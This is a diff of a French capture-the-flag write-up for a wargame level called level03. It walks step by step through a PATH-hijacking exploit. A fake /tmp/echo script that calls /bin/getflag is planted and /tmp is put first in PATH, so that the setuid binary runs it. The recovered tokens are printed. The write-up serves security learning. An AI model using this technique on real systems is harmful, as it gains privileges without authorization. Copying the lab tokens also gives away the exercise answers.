@@ -2,8 +2,30 @@
                           LEVEL03
 -----------------------------------------------------------
 
-4. Pour enfin obtenir le mdp pour passer au niveau 1 en 
-   utilisant la commande getflag
+1. On execute le ficher level03 qui nous affichier "Exploit
+   me"
    --------------------------------------------------------
-    CM : getflag
-    OUTPUT : Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
+   CM : ./level03
+   OUTPUT : Exploit me
+
+2. On fait un hexdump puis un strings du fichier level03,
+   ce qui nous afficher le contenue de l'executable. On
+   remarque que le contenu contient la ligne suivante 
+   --------------------------------------------------------
+   CM : strings level03
+   OUTPUT : /usr/bin/echo "Exploit me"
+
+3. Pour l'exploiter on 
+   --------------------------------------------------------
+   a. Créé un script echo dans tmp contenant /bin/getflag 
+      CM : echo "/bin/getflag" > /tmp/echo
+   b. Donne les permissions +x au script
+      CM : chmod +x /tmp/echo
+   c. Change le PATH pour ajouter /tmp en premier 
+      CM : export PATH="/tmp:$PATH"
+
+4. En appelant ./level03  ca appel le script /tmp/echo qui lui 
+   meme appel le script /bin/getflag on obtient donc le flag
+   --------------------------------------------------------
+   CM : ./level03
+   OUTPUT : Here is your token : qi0maab88jeaj46qoumi7maus
